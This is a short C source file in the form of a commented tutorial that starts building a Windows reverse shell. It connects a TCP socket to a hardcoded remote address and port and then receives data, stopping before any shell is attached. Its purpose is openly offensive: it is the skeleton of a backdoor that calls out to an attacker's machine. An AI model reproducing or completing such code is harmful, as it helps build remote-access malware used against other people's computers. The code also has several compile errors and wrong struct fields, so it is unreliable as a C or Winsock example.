//Let's Create a basic windows reverse shell in C.
//Let's import necessary libraries.
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

//Entry Point 
int main()
{
    //Create a shell socket essentials.
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    char buffer[1024];
    int connect;
    char ip_addr[] = "192.168.1.1";
    int port = 8888;

    //Implement the WSA startup function.
    WSAStartup(MAKEWORD(2, 2) &wsa); //Initialization of the winsock.

    //Create a TCP connection stream socket.//specify protocol also.
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    //Let's include initialized shell_addr details.
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_port = htons(port);
    shell_addr.s_addr.s_addr = inet_addr(ip_addr);

    //Now will implement connect option.
    connect = WSAConnect(shell, (struct SOCKADDR *) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL); //Connect to the target server.

    //if connect function not worked correctly print the error
    if(connect == SOCKET_ERROR)
    {
        printf("Unable to establish a connection with the server.\n");
        exit(0); //Terminate the program.
    }

    //if the connection was success do the following
    else
    {
        //implement recv.(Socket_Descripter, Buffer, Sizeof the buffer, Null as 0).
        recv(shell, buffer, sizeof(buffer), 0);
    }

}
